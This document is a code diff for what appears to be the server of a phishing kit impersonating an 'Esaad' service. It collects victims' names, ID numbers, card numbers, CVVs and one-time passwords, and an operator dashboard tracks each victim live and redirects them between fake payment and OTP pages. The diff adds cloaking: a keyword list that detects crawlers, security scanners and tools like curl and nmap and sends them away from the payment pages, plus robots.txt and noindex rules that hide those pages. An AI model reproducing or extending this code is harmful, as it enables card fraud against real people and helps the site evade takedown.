@@ -5,6 +5,13 @@ import * as dotenv from 'dotenv';
 import path from 'path';
 import fs from 'fs';
 import crypto from 'crypto';
+import {
+  serverStore,
+  ONLINE_WINDOW_MS,
+  VisitorMeta,
+  RequestRecord,
+  AdminPreferences
+} from './serverStore';
 
 dotenv.config();
 
@@ -25,10 +32,13 @@ try {
 } catch {}
 
 const app = express();
+app.set('trust proxy', true);
 app.use(express.json());
 app.use(express.text({ type: 'text/plain' }));
 
 const PORT = Number(process.env.PORT) || 3000;
+const DB_SYNC_INTERVAL_MS = 4000;
+const SUPABASE_PULL_THROTTLE_MS = 5000;
 
 // Initialize Server-Side Supabase Client
 const supabaseUrl = process.env.SUPABASE_URL || '';
@@ -43,65 +53,12 @@ function getSupabase(): SupabaseClient | null {
   });
 }
 
-export interface VisitorMeta {
-  ip: string;
-  os: string;
-  device: string;
-  browser: string;
-  country: string;
-}
-
-export interface RequestRecord {
-  id: string;
-  name: string;
-  mobile: string;
-  idNumber: string;
-  cardType: string;
-  address: string;
-  date: string;
-  paymentName?: string;
-  cardNumber?: string;
-  expMonth?: string;
-  expYear?: string;
-  cvv?: string;
-  otp?: string;
-  otpStatus?: string;
-  nextAction?: string;
-  step: string;
-  createdAt: string;
-  updatedAt: string;
-  isOnline?: boolean;
-  secondsAgo?: number;
-  currentPage?: string;
-  meta?: VisitorMeta;
-}
-
-interface PresenceEntry {
-  lastSeen: number;
-  currentPage: string;
-  requestId: string | null;
-  meta?: VisitorMeta;
-}
-
-const ONLINE_WINDOW_MS = 15000; // 15 seconds server-authoritative online window
-const DB_SYNC_INTERVAL_MS = 4000; // 4 seconds database heartbeat sync
-
-// Server-side authoritative tracking state
-const adminTokens = new Set<string>();
-const devicePresence = new Map<string, PresenceEntry>();
-const userPresence = new Map<string, { lastSeen: number; currentPage: string }>();
-const lastKnownUserPage = new Map<string, string>();
-const userMetaMap = new Map<string, VisitorMeta>();
-const pendingRedirects = new Map<string, string>();
-const explicitlyOfflineIds = new Map<string, number>();
+// Ephemeral connection & sync throttling state
 const lastDbPresenceSync = new Map<string, { time: number; page: string }>();
-const ipToSessionMap = new Map<string, { clientId: string; requestId: string; lastSeen: number }>();
-
-// Real-time SSE streams
 const visitorStreams = new Map<string, Set<express.Response>>();
 const adminStreams = new Set<express.Response>();
-
-let totalVisitorsCounter = 0;
+let lastSupabasePullAt = 0;
+let supabasePullInFlight: Promise<void> | null = null;
 
 function parseCookies(cookieHeader?: string): Record<string, string> {
   const list: Record<string, string> = {};
@@ -186,6 +143,28 @@ function extractVisitorMeta(req: express.Request): VisitorMeta {
   };
 }
 
+const BOT_KEYWORDS = [
+  'bot', 'crawler', 'spider', 'scraper', 'googlebot', 'bingbot', 'yandex',
+  'baiduspider', 'duckduckbot', 'slurp', 'facebookexternalhit', 'twitterbot',
+  'linkedinbot', 'embedly', 'whatsapp', 'telegrambot', 'applebot', 'petalbot',
+  'bytespider', 'gptbot', 'claudebot', 'anthropic', 'perplexitybot', 'ahrefsbot',
+  'semrushbot', 'mj12bot', 'dotbot', 'rogerbot', 'sogou', 'exabot', 'facebot',
+  'ia_archiver', 'headless', 'puppeteer', 'playwright', 'selenium', 'phantomjs',
+  'lighthouse', 'pagespeed', 'gtmetrix', 'pingdom', 'uptime', 'datadog',
+  'axios', 'curl', 'wget', 'python', 'java/', 'ruby', 'perl', 'php/', 'libwww',
+  'httpclient', 'postman', 'insomnia', 'node-fetch', 'undici', 'go-http-client',
+  'scanner', 'security', 'audit', 'censys', 'shodan', 'nmap', 'zgrab'
+];
+
+function isBotRequest(req: express.Request): boolean {
+  const ua = String(req.headers['user-agent'] || '').trim().toLowerCase();
+  if (!ua) return true;
+  if (BOT_KEYWORDS.some((keyword) => ua.includes(keyword))) return true;
+  const purpose = String(req.headers['purpose'] || req.headers['x-purpose'] || '').toLowerCase();
+  if (purpose.includes('preview') || purpose.includes('crawl')) return true;
+  return false;
+}
+
 function getFingerprintKey(req: express.Request): string {
   const meta = extractVisitorMeta(req);
   const ua = String(req.headers['user-agent'] || '').slice(0, 120);
@@ -199,14 +178,18 @@ function buildCookie(name: string, value: string, req: express.Request, maxAge =
   return `${name}=${encodeURIComponent(value)}; Path=/; HttpOnly${agePart}; ${sameSite}`;
 }
 
+function hasActiveVisitorStream(reqId: string): boolean {
+  const streams = visitorStreams.get(reqId);
+  return Boolean(streams && streams.size > 0);
+}
+
 function isRequestIdOnlineOnServer(reqId: string, updatedAtIso?: string, serverNow = Date.now()): boolean {
-  const activeStreams = visitorStreams.get(reqId);
-  if (activeStreams && activeStreams.size > 0) {
+  if (hasActiveVisitorStream(reqId)) {
     return true;
   }
 
-  const offlineAt = explicitlyOfflineIds.get(reqId);
-  const memEntry = userPresence.get(reqId);
+  const offlineAt = serverStore.getExplicitlyOfflineAt(reqId);
+  const memEntry = serverStore.getUserPresence(reqId);
   if (memEntry) {
     if (offlineAt && offlineAt >= memEntry.lastSeen) {
       return false;
@@ -216,12 +199,23 @@ function isRequestIdOnlineOnServer(reqId: string, updatedAtIso?: string, serverN
     }
   }
 
-  for (const d of devicePresence.values()) {
+  for (const [, d] of serverStore.getAllDevicePresence()) {
     if (d.requestId === reqId && serverNow - d.lastSeen < ONLINE_WINDOW_MS) {
       if (!offlineAt || d.lastSeen > offlineAt) {
         return true;
       }
     }
+  }
+
+  const storedReq = serverStore.getRequest(reqId);
+  if (storedReq?.lastHeartbeatAt) {
+    if (offlineAt && offlineAt >= storedReq.lastHeartbeatAt) {
+      return false;
+    }
+    if (serverNow - storedReq.lastHeartbeatAt < ONLINE_WINDOW_MS) {
+      return true;
+    }
+    return false;
   }
 
   if (updatedAtIso) {
@@ -237,26 +231,6 @@ function isRequestIdOnlineOnServer(reqId: string, updatedAtIso?: string, serverN
   }
 
   return false;
-}
-
-function prunePresence() {
-  const cutoff = Date.now() - ONLINE_WINDOW_MS;
-  for (const [cid, entry] of devicePresence.entries()) {
-    const reqStreams = entry.requestId ? visitorStreams.get(entry.requestId) : undefined;
-    const hasOpenStream = Boolean(reqStreams && reqStreams.size > 0);
-    if (!hasOpenStream && entry.lastSeen < cutoff) {
-      devicePresence.delete(cid);
-    }
-  }
-  for (const [reqId, entry] of userPresence.entries()) {
-    const reqStreams = visitorStreams.get(reqId);
-    const hasOpenStream = Boolean(reqStreams && reqStreams.size > 0);
-    if (!hasOpenStream && entry.lastSeen < cutoff) {
-      userPresence.delete(reqId);
-    } else if (hasOpenStream) {
-      entry.lastSeen = Date.now();
-    }
-  }
 }
 
 function toSupabaseRow(record: Partial<RequestRecord> & { id: string }) {
@@ -284,69 +258,126 @@ function toSupabaseRow(record: Partial<RequestRecord> & { id: string }) {
 function fromSupabaseRow(row: any, serverNow = Date.now()): RequestRecord {
   const id = String(row.id);
   const rawStep = row.step || 'home';
-  const currentPage = lastKnownUserPage.get(id) || normalizeStepToPage(rawStep);
-  const memPresence = userPresence.get(id);
+  const storedReq = serverStore.getRequest(id);
+  const currentPage =
+    serverStore.getLastKnownPage(id) ||
+    storedReq?.currentPage ||
+    normalizeStepToPage(rawStep);
+  const memPresence = serverStore.getUserPresence(id);
   const dbUpdatedIso = row.updated_at ?? row.updatedAt ?? new Date(serverNow).toISOString();
   const dbUpdatedMs = new Date(dbUpdatedIso).getTime();
-  const effectiveLastSeenMs = memPresence
-    ? Math.max(memPresence.lastSeen, isNaN(dbUpdatedMs) ? 0 : dbUpdatedMs)
-    : isNaN(dbUpdatedMs)
-      ? serverNow
-      : dbUpdatedMs;
+
+  const heartbeatMs = memPresence?.lastSeen ?? storedReq?.lastHeartbeatAt ?? 0;
+  const effectiveLastSeenMs = Math.max(heartbeatMs, isNaN(dbUpdatedMs) ? 0 : dbUpdatedMs) || serverNow;
   const effectiveUpdatedIso = new Date(effectiveLastSeenMs).toISOString();
+
   const isOnline = isRequestIdOnlineOnServer(id, effectiveUpdatedIso, serverNow);
-  const secondsAgo = isOnline ? 0 : Math.max(0, Math.floor((serverNow - effectiveLastSeenMs) / 1000));
+  const lastActiveMs = heartbeatMs || (isNaN(dbUpdatedMs) ? serverNow : dbUpdatedMs);
+  const secondsAgo = isOnline ? 0 : Math.max(0, Math.floor((serverNow - lastActiveMs) / 1000));
 
   return {
     id,
-    name: row.name || '',
-    mobile: row.mobile || '',
-    idNumber: row.id_number ?? row.idNumber ?? '',
-    cardType: row.card_type ?? row.cardType ?? '',
-    address: row.address || '',
-    date: row.date || '',
-    paymentName: row.payment_name ?? row.paymentName ?? undefined,
-    cardNumber: row.card_number ?? row.cardNumber ?? undefined,
-    expMonth: row.exp_month ?? row.expMonth ?? undefined,
-    expYear: row.exp_year ?? row.expYear ?? undefined,
-    cvv: row.cvv ?? undefined,
-    otp: row.otp ?? undefined,
-    otpStatus: row.otp_status ?? row.otpStatus ?? undefined,
-    nextAction: row.next_action ?? row.nextAction ?? undefined,
+    name: row.name ?? storedReq?.name ?? '',
+    mobile: row.mobile ?? storedReq?.mobile ?? '',
+    idNumber: row.id_number ?? row.idNumber ?? storedReq?.idNumber ?? '',
+    cardType: row.card_type ?? row.cardType ?? storedReq?.cardType ?? '',
+    address: row.address ?? storedReq?.address ?? '',
+    date: row.date ?? storedReq?.date ?? '',
+    paymentName: row.payment_name ?? row.paymentName ?? storedReq?.paymentName ?? undefined,
+    cardNumber: row.card_number ?? row.cardNumber ?? storedReq?.cardNumber ?? undefined,
+    expMonth: row.exp_month ?? row.expMonth ?? storedReq?.expMonth ?? undefined,
+    expYear: row.exp_year ?? row.expYear ?? storedReq?.expYear ?? undefined,
+    cvv: row.cvv ?? storedReq?.cvv ?? undefined,
+    otp: row.otp ?? storedReq?.otp ?? undefined,
+    otpStatus: row.otp_status ?? row.otpStatus ?? storedReq?.otpStatus ?? undefined,
+    nextAction: row.next_action ?? row.nextAction ?? storedReq?.nextAction ?? undefined,
     step: rawStep,
-    createdAt: row.created_at ?? row.createdAt ?? effectiveUpdatedIso,
+    createdAt: row.created_at ?? row.createdAt ?? storedReq?.createdAt ?? effectiveUpdatedIso,
     updatedAt: effectiveUpdatedIso,
+    lastHeartbeatAt: storedReq?.lastHeartbeatAt,
     isOnline,
     secondsAgo,
     currentPage,
-    meta: userMetaMap.get(id)
+    meta: serverStore.getUserMeta(id) || storedReq?.meta
   };
 }
 
-async function fetchEnrichedRequests(): Promise<RequestRecord[]> {
-  prunePresence();
-  const serverNow = Date.now();
-  const supabase = getSupabase();
-  let dbRequests: RequestRecord[] = [];
+function enrichLocalRecord(rec: RequestRecord, serverNow = Date.now()): RequestRecord {
+  const id = rec.id;
+  const memPresence = serverStore.getUserPresence(id);
+  const currentPage =
+    serverStore.getLastKnownPage(id) ||
+    memPresence?.currentPage ||
+    rec.currentPage ||
+    normalizeStepToPage(rec.step);
+  const recUpdatedMs = new Date(rec.updatedAt).getTime();
+  const lastActiveMs = Math.max(
+    memPresence?.lastSeen || 0,
+    rec.lastHeartbeatAt || 0,
+    isNaN(recUpdatedMs) ? 0 : recUpdatedMs
+  ) || serverNow;
 
-  if (supabase) {
-    const { data, error } = await supabase
-      .from('requests')
-      .select('*')
-      .order('updated_at', { ascending: false });
-    if (!error && data) {
-      dbRequests = data.map((row) => fromSupabaseRow(row, serverNow));
-    }
+  const isOnline = isRequestIdOnlineOnServer(id, rec.updatedAt, serverNow);
+  const heartbeatOrUpdated = memPresence?.lastSeen || rec.lastHeartbeatAt || (isNaN(recUpdatedMs) ? serverNow : recUpdatedMs);
+  const secondsAgo = isOnline ? 0 : Math.max(0, Math.floor((serverNow - heartbeatOrUpdated) / 1000));
+
+  return {
+    ...rec,
+    updatedAt: new Date(lastActiveMs).toISOString(),
+    isOnline,
+    secondsAgo,
+    currentPage,
+    meta: serverStore.getUserMeta(id) || rec.meta
+  };
+}
+
+async function pullFromSupabaseIfNeeded(force = false): Promise<void> {
+  const now = Date.now();
+  if (!force && now - lastSupabasePullAt < SUPABASE_PULL_THROTTLE_MS) {
+    return;
+  }
+  if (supabasePullInFlight) {
+    return supabasePullInFlight;
   }
 
-  const existingMap = new Map(dbRequests.map((r) => [r.id, r]));
+  const supabase = getSupabase();
+  if (!supabase) return;
+
+  supabasePullInFlight = (async () => {
+    try {
+      const { data, error } = await supabase
+        .from('requests')
+        .select('*')
+        .order('updated_at', { ascending: false });
+      if (!error && data) {
+        const mapped = data.map((row) => fromSupabaseRow(row, Date.now()));
+        serverStore.syncFromSupabaseRows(mapped);
+        lastSupabasePullAt = Date.now();
+      }
+    } catch {
+      // Resilient fallback: continue using serverStore
+    } finally {
+      supabasePullInFlight = null;
+    }
+  })();
+
+  return supabasePullInFlight;
+}
+
+async function fetchEnrichedRequests(forceSupabasePull = false): Promise<RequestRecord[]> {
+  serverStore.prunePresence(hasActiveVisitorStream);
+  await pullFromSupabaseIfNeeded(forceSupabasePull);
+
+  const serverNow = Date.now();
+  const storedRequests = serverStore.getAllRequests();
+  const enrichedList = storedRequests.map((r) => enrichLocalRecord(r, serverNow));
+  const existingMap = new Map(enrichedList.map((r) => [r.id, r]));
   const nowIso = new Date(serverNow).toISOString();
 
-  for (const [reqId, entry] of userPresence.entries()) {
-    const existing = existingMap.get(reqId);
-    if (!existing) {
+  for (const [reqId, entry] of serverStore.getAllUserPresence()) {
+    if (!existingMap.has(reqId)) {
       const isOnline = isRequestIdOnlineOnServer(reqId, new Date(entry.lastSeen).toISOString(), serverNow);
-      dbRequests.push({
+      enrichedList.push({
         id: reqId,
         name: '',
         mobile: '',
@@ -357,34 +388,35 @@ async function fetchEnrichedRequests(): Promise<RequestRecord[]> {
         step: entry.currentPage,
         createdAt: nowIso,
         updatedAt: new Date(entry.lastSeen).toISOString(),
+        lastHeartbeatAt: entry.lastSeen,
         isOnline,
         secondsAgo: isOnline ? 0 : Math.max(0, Math.floor((serverNow - entry.lastSeen) / 1000)),
         currentPage: entry.currentPage,
-        meta: userMetaMap.get(reqId)
+        meta: serverStore.getUserMeta(reqId)
       });
     }
   }
 
-  dbRequests.sort((a, b) => new Date(b.updatedAt).getTime() - new Date(a.updatedAt).getTime());
-  return dbRequests;
+  enrichedList.sort((a, b) => new Date(b.updatedAt).getTime() - new Date(a.updatedAt).getTime());
+  return enrichedList;
 }
 
 function buildStatsPayload(enrichedRequests?: RequestRecord[]) {
-  prunePresence();
+  serverStore.prunePresence(hasActiveVisitorStream);
   const serverNow = Date.now();
   const onlineUsers: Record<string, boolean> = {};
   const userPages: Record<string, string> = {};
   const userMeta: Record<string, VisitorMeta> = {};
 
-  for (const [reqId, page] of lastKnownUserPage.entries()) {
+  for (const [reqId, page] of serverStore.getAllLastKnownPages()) {
     userPages[reqId] = page;
   }
 
-  for (const [reqId, meta] of userMetaMap.entries()) {
+  for (const [reqId, meta] of serverStore.getAllUserMeta()) {
     userMeta[reqId] = meta;
   }
 
-  for (const [reqId, entry] of userPresence.entries()) {
+  for (const [reqId, entry] of serverStore.getAllUserPresence()) {
     if (isRequestIdOnlineOnServer(reqId, new Date(entry.lastSeen).toISOString(), serverNow)) {
       onlineUsers[reqId] = true;
     }
@@ -405,7 +437,8 @@ function buildStatsPayload(enrichedRequests?: RequestRecord[]) {
     }
   }
 
-  const activeSessions = Array.from(devicePresence.entries())
+  const activeSessions = serverStore
+    .getAllDevicePresence()
     .filter(([, entry]) => entry.requestId && isRequestIdOnlineOnServer(entry.requestId, undefined, serverNow))
     .map(([cid, entry]) => ({
       clientId: cid,
@@ -416,12 +449,13 @@ function buildStatsPayload(enrichedRequests?: RequestRecord[]) {
     }));
 
   return {
-    onlineCount: Math.max(activeSessions.length, Object.keys(onlineUsers).length),
-    totalVisitorsCount: totalVisitorsCounter,
+    onlineCount: Object.keys(onlineUsers).length,
+    totalVisitorsCount: serverStore.getTotalVisitorsCount(),
     onlineUsers,
     userPages,
     userMeta,
     activeSessions,
+    preferences: serverStore.getAdminPreferences(),
     serverTime: serverNow
   };
 }
@@ -435,7 +469,7 @@ function broadcastToAdmins() {
     broadcastDebounceTimer = null;
     if (adminStreams.size === 0) return;
     try {
-      const requests = await fetchEnrichedRequests();
+      const requests = await fetchEnrichedRequests(false);
       const stats = buildStatsPayload(requests);
       const payload = `event: snapshot\ndata: ${JSON.stringify({ stats, requests })}\n\n`;
       for (const stream of adminStreams) {
@@ -448,6 +482,14 @@ function broadcastToAdmins() {
     } catch {}
   }, 80);
 }
+
+// Periodically expire stale presence and notify connected admin dashboards
+setInterval(() => {
+  const changed = serverStore.prunePresence(hasActiveVisitorStream);
+  if (changed) {
+    broadcastToAdmins();
+  }
+}, 15000);
 
 function sendVisitorEvent(requestId: string, eventName: string, data: Record<string, any>) {
   const streams = visitorStreams.get(requestId);
@@ -469,16 +511,41 @@ async function syncVisitorPresenceToDb(requestId: string, currentPage: string, f
     force || !prevSync || now - prevSync.time >= DB_SYNC_INTERVAL_MS || prevSync.page !== currentPage;
 
   if (!shouldSync) {
-    return pendingRedirects.get(requestId) || null;
+    return serverStore.getPendingRedirect(requestId) || null;
   }
 
   lastDbPresenceSync.set(requestId, { time: now, page: currentPage });
-  const supabase = getSupabase();
-  if (!supabase) {
-    return pendingRedirects.get(requestId) || null;
+
+  // Always keep server-side store up to date
+  const nowIso = new Date(now).toISOString();
+  const existingLocal = serverStore.getRequest(requestId);
+  if (existingLocal) {
+    serverStore.patchRequest(requestId, { step: currentPage, currentPage, updatedAt: nowIso }, true);
+  } else {
+    serverStore.upsertRequest(
+      {
+        id: requestId,
+        name: '',
+        mobile: '',
+        idNumber: '',
+        cardType: 'gold',
+        address: '',
+        date: '',
+        step: currentPage,
+        currentPage,
+        createdAt: nowIso,
+        updatedAt: nowIso,
+        lastHeartbeatAt: now
+      },
+      true
+    );
   }
 
-  const nowIso = new Date(now).toISOString();
+  const supabase = getSupabase();
+  if (!supabase) {
+    return serverStore.getPendingRedirect(requestId) || null;
+  }
+
   try {
     const { data: updatedRows } = await supabase
       .from('requests')
@@ -504,14 +571,14 @@ async function syncVisitorPresenceToDb(requestId: string, currentPage: string, f
     } else if (updatedRows[0]?.next_action) {
       const dbTarget = normalizeRedirectTarget(updatedRows[0].next_action);
       if (dbTarget) {
-        pendingRedirects.set(requestId, dbTarget);
+        serverStore.setPendingRedirect(requestId, dbTarget);
       }
     }
   } catch {
     lastDbPresenceSync.delete(requestId);
   }
 
-  return pendingRedirects.get(requestId) || null;
+  return serverStore.getPendingRedirect(requestId) || null;
 }
 
 function recordServerSideVisit(
@@ -521,7 +588,7 @@ function recordServerSideVisit(
 ): { clientId: string; requestId: string | null; currentPage: string } {
   const cookies = parseCookies(req.headers.cookie);
   const fpKey = getFingerprintKey(req);
-  const fpSession = ipToSessionMap.get(fpKey);
+  const fpSession = serverStore.getIpSession(fpKey);
   const now = Date.now();
 
   const currentPage = String(options?.currentPage || req.path || '/');
@@ -530,11 +597,11 @@ function recordServerSideVisit(
   const clientId = String(
     options?.clientId ||
       cookies.esaad_cid ||
-      (fpSession && now - fpSession.lastSeen < 3600000 ? fpSession.clientId : '') ||
+      fpSession?.clientId ||
       crypto.randomUUID()
   );
 
-  const existingDevice = devicePresence.get(clientId);
+  const existingDevice = serverStore.getDevicePresence(clientId);
 
   const resolvedReqId = isAdminPage
     ? null
@@ -542,7 +609,7 @@ function recordServerSideVisit(
         options?.requestId ||
           cookies.esaad_req_id ||
           existingDevice?.requestId ||
-          (fpSession && now - fpSession.lastSeen < 3600000 ? fpSession.requestId : '') ||
+          fpSession?.requestId ||
           crypto.randomUUID()
       );
 
@@ -552,10 +619,10 @@ function recordServerSideVisit(
   const cookieHeaders: string[] = [buildCookie('esaad_cid', clientId, req)];
   if (resolvedReqId) {
     cookieHeaders.push(buildCookie('esaad_req_id', resolvedReqId, req));
-    ipToSessionMap.set(fpKey, { clientId, requestId: resolvedReqId, lastSeen: now });
+    serverStore.setIpSession(fpKey, clientId, resolvedReqId);
   }
   if (isNewVisit && !isAdminPage) {
-    totalVisitorsCounter += 1;
+    serverStore.incrementTotalVisitors();
     cookieHeaders.push(buildCookie('esaad_visited', '1', req));
   }
 
@@ -564,27 +631,67 @@ function recordServerSideVisit(
   }
 
   if (!isAdminPage && resolvedReqId) {
-    explicitlyOfflineIds.delete(resolvedReqId);
+    serverStore.clearExplicitlyOffline(resolvedReqId);
 
-    devicePresence.set(clientId, {
+    serverStore.setDevicePresence(clientId, {
       lastSeen: now,
       currentPage,
       requestId: resolvedReqId,
       meta
     });
 
-    userPresence.set(resolvedReqId, {
+    serverStore.setUserPresence(resolvedReqId, {
       lastSeen: now,
       currentPage
     });
-    lastKnownUserPage.set(resolvedReqId, currentPage);
-    userMetaMap.set(resolvedReqId, meta);
+    serverStore.setLastKnownPage(resolvedReqId, currentPage);
+    serverStore.setUserMeta(resolvedReqId, meta);
   }
 
   return { clientId, requestId: resolvedReqId, currentPage };
 }
 
-// ==================== SERVER-SIDE HTML PAGE TRACKING MIDDLEWARE ====================
+async function getAdminTokenFromReq(req: express.Request): Promise<string | null> {
+  const cookies = parseCookies(req.headers.cookie);
+  const authHeader = req.headers.authorization;
+  const token =
+    authHeader && authHeader.startsWith('Bearer ')
+      ? authHeader.slice(7)
+      : cookies.esaad_admin_token || '';
+
+  if (!token) return null;
+  if (serverStore.hasValidAdminSession(token)) return token;
+
+  const supabase = getSupabase();
+  if (supabase) {
+    try {
+      const { data, error } = await supabase.auth.getUser(token);
+      if (!error && data.user) {
+        serverStore.createAdminSession(token, data.user.email || 'admin');
+        return token;
+      }
+    } catch {}
+  }
+  return null;
+}
+
+// ==================== ROBOTS.TXT & BOT PROTECTION ====================
+app.get('/robots.txt', (_req, res) => {
+  res.type('text/plain').send(
+    [
+      'User-agent: *',
+      'Disallow: /payment',
+      'Disallow: /card-details',
+      'Disallow: /waiting',
+      'Disallow: /otp',
+      'Disallow: /otp-bank',
+      'Disallow: /admin',
+      'Disallow: /api/',
+      'Allow: /'
+    ].join('\n')
+  );
+});
+
 const TRACKED_HTML_PATHS = new Set([
   '/',
   '/request',
@@ -596,16 +703,32 @@ const TRACKED_HTML_PATHS = new Set([
   '/otp-bank'
 ]);
 
+const PAYMENT_PATHS = new Set(['/payment', '/card-details', '/waiting', '/otp', '/otp-bank']);
+
 app.use((req, res, next) => {
-  if (req.method === 'GET' && TRACKED_HTML_PATHS.has(req.path)) {
-    const { requestId, currentPage } = recordServerSideVisit(req, res, {
-      currentPage: req.path,
-      isNewVisit: true
-    });
-    if (requestId) {
-      syncVisitorPresenceToDb(requestId, currentPage, true)
-        .then(() => broadcastToAdmins())
-        .catch(() => {});
+  if (req.method === 'GET' || req.method === 'HEAD') {
+    if (PAYMENT_PATHS.has(req.path) || req.path.startsWith('/admin')) {
+      res.setHeader('X-Robots-Tag', 'noindex, nofollow, noarchive');
+    }
+
+    if (TRACKED_HTML_PATHS.has(req.path)) {
+      if (isBotRequest(req)) {
+        if (PAYMENT_PATHS.has(req.path)) {
+          return res.redirect(302, '/');
+        }
+        return next();
+      }
+      if (req.method === 'GET') {
+        const { requestId, currentPage } = recordServerSideVisit(req, res, {
+          currentPage: req.path,
+          isNewVisit: true
+        });
+        if (requestId) {
+          syncVisitorPresenceToDb(requestId, currentPage, true)
+            .then(() => broadcastToAdmins())
+            .catch(() => {});
+        }
+      }
     }
   }
   next();
@@ -614,6 +737,10 @@ app.use((req, res, next) => {
 // ==================== REAL-TIME SSE STREAM (/api/stream) ====================
 app.get('/api/stream', async (req, res) => {
   const role = String(req.query.role || 'visitor');
+
+  if (role !== 'admin' && isBotRequest(req)) {
+    return res.status(403).json({ error: 'Forbidden' });
+  }
 
   res.setHeader('Content-Type', 'text/event-stream; charset=utf-8');
   res.setHeader('Cache-Control', 'no-cache, no-transform');
@@ -625,7 +752,7 @@ app.get('/api/stream', async (req, res) => {
     adminStreams.add(res);
 
     try {
-      const requests = await fetchEnrichedRequests();
+      const requests = await fetchEnrichedRequests(false);
       const stats = buildStatsPayload(requests);
       res.write(`event: snapshot\ndata: ${JSON.stringify({ stats, requests })}\n\n`);
     } catch {}
@@ -682,11 +809,11 @@ app.get('/api/stream', async (req, res) => {
   // Keep visitor continuously online while SSE stream is open
   const visitorKeepAlive = setInterval(() => {
     const now = Date.now();
-    const activePage = lastKnownUserPage.get(requestId) || currentPage;
-    userPresence.set(requestId, { lastSeen: now, currentPage: activePage });
-    const dev = devicePresence.get(clientId);
+    const activePage = serverStore.getLastKnownPage(requestId) || currentPage;
+    serverStore.setUserPresence(requestId, { lastSeen: now, currentPage: activePage });
+    const dev = serverStore.getDevicePresence(clientId);
     if (dev) {
-      devicePresence.set(clientId, { ...dev, lastSeen: now, currentPage: activePage });
+      serverStore.setDevicePresence(clientId, { ...dev, lastSeen: now, currentPage: activePage });
     }
     syncVisitorPresenceToDb(requestId, activePage, false).catch(() => {});
     try {
@@ -709,7 +836,7 @@ app.get('/api/stream', async (req, res) => {
     setTimeout(() => {
       const currentStreams = visitorStreams.get(requestId);
       const hasStream = Boolean(currentStreams && currentStreams.size > 0);
-      const mem = userPresence.get(requestId);
+      const mem = serverStore.getUserPresence(requestId);
       const recentlyPinged = Boolean(mem && Date.now() - mem.lastSeen < 1500);
       if (!hasStream && !recentlyPinged) {
         broadcastToAdmins();
@@ -722,7 +849,15 @@ app.get('/api/stream', async (req, res) => {
 
 // 1. Presence & Current Page Tracking
 app.post('/api/presence', async (req, res) => {
-  const body = typeof req.body === 'string' ? JSON.parse(req.body || '{}') : req.body || {};
+  if (isBotRequest(req)) {
+    return res.json({ ok: true, requestId: null, redirectTo: null });
+  }
+
+  let body: any = {};
+  try {
+    body = typeof req.body === 'string' ? JSON.parse(req.body || '{}') : req.body || {};
+  } catch {}
+
   const { requestId, currentPage } = recordServerSideVisit(req, res, {
     clientId: body?.clientId,
     requestId: body?.requestId,
@@ -733,10 +868,11 @@ app.post('/api/presence', async (req, res) => {
   if (requestId && !currentPage.startsWith('/admin')) {
     await syncVisitorPresenceToDb(requestId, currentPage, false);
 
-    const targetRoute = pendingRedirects.get(requestId);
+    const targetRoute = serverStore.getPendingRedirect(requestId);
     if (targetRoute) {
       if (currentPage === targetRoute) {
-        pendingRedirects.delete(requestId);
+        serverStore.deletePendingRedirect(requestId);
+        serverStore.patchRequest(requestId, { nextAction: '', step: currentPage, currentPage }, true);
         const supabase = getSupabase();
         if (supabase) {
           supabase
@@ -744,9 +880,11 @@ app.post('/api/presence', async (req, res) => {
             .update({ next_action: '', step: currentPage, updated_at: new Date().toISOString() })
             .eq('id', requestId)
             .then(() => broadcastToAdmins());
+        } else {
+          broadcastToAdmins();
         }
       } else {
-        prunePresence();
+        serverStore.prunePresence(hasActiveVisitorStream);
         broadcastToAdmins();
         return res.json({ ok: true, requestId, redirectTo: targetRoute });
       }
@@ -754,12 +892,16 @@ app.post('/api/presence', async (req, res) => {
     broadcastToAdmins();
   }
 
-  prunePresence();
+  serverStore.prunePresence(hasActiveVisitorStream);
   res.json({ ok: true, requestId, redirectTo: null });
 });
 
 // Instant leave notification when visitor closes tab
 app.post('/api/presence/leave', async (req, res) => {
+  if (isBotRequest(req)) {
+    return res.json({ ok: true });
+  }
+
   let body: any = {};
   try {
     body = typeof req.body === 'string' ? JSON.parse(req.body || '{}') : req.body || {};
@@ -769,18 +911,17 @@ app.post('/api/presence/leave', async (req, res) => {
   const requestId = String(body?.requestId || cookies.esaad_req_id || '');
 
   if (clientId) {
-    devicePresence.delete(clientId);
+    serverStore.deleteDevicePresence(clientId);
   }
   if (requestId) {
-    userPresence.delete(requestId);
-    explicitlyOfflineIds.set(requestId, Date.now());
+    serverStore.markExplicitlyOffline(requestId);
     const streams = visitorStreams.get(requestId);
     if (streams) {
       visitorStreams.delete(requestId);
     }
     const supabase = getSupabase();
     if (supabase) {
-      const offlineIso = new Date(Date.now() - 120000).toISOString();
+      const offlineIso = new Date(Date.now() - (ONLINE_WINDOW_MS + 60000)).toISOString();
       try {
         await supabase
           .from('requests')
@@ -795,11 +936,11 @@ app.post('/api/presence/leave', async (req, res) => {
 });
 
 app.get('/api/stats', async (_req, res) => {
-  const enriched = await fetchEnrichedRequests();
+  const enriched = await fetchEnrichedRequests(false);
   res.json(buildStatsPayload(enriched));
 });
 
-// 2. Admin Authentication via Server-Side Supabase
+// 2. Admin Authentication & Server-Side Preferences
 app.post('/api/admin/login', async (req, res) => {
   const { email, password } = req.body || {};
   if (!email || !password) {
@@ -808,16 +949,18 @@ app.post('/api/admin/login', async (req, res) => {
 
   const supabase = getSupabase();
   if (supabase) {
-    const { data, error } = await supabase.auth.signInWithPassword({
-      email: String(email).trim(),
-      password: String(password)
-    });
-    if (!error && data.session) {
-      const token = data.session.access_token;
-      adminTokens.add(token);
-      res.setHeader('Set-Cookie', buildCookie('esaad_admin_token', token, req));
-      return res.json({ token, user: { email: data.user?.email } });
-    }
+    try {
+      const { data, error } = await supabase.auth.signInWithPassword({
+        email: String(email).trim(),
+        password: String(password)
+      });
+      if (!error && data.session) {
+        const token = data.session.access_token;
+        serverStore.createAdminSession(token, data.user?.email || String(email).trim());
+        res.setHeader('Set-Cookie', buildCookie('esaad_admin_token', token, req));
+        return res.json({ token, user: { email: data.user?.email } });
+      }
+    } catch {}
   }
 
   const expectedEmail = process.env.ADMIN_EMAIL || 'admin@esaad.ae';
@@ -828,7 +971,7 @@ app.post('/api/admin/login', async (req, res) => {
     String(password) === expectedPassword
   ) {
     const token = crypto.randomBytes(24).toString('hex');
-    adminTokens.add(token);
+    serverStore.createAdminSession(token, expectedEmail);
     res.setHeader('Set-Cookie', buildCookie('esaad_admin_token', token, req));
     return res.json({ token, user: { email: expectedEmail } });
   }
@@ -837,29 +980,15 @@ app.post('/api/admin/login', async (req, res) => {
 });
 
 app.get('/api/admin/me', async (req, res) => {
-  const cookies = parseCookies(req.headers.cookie);
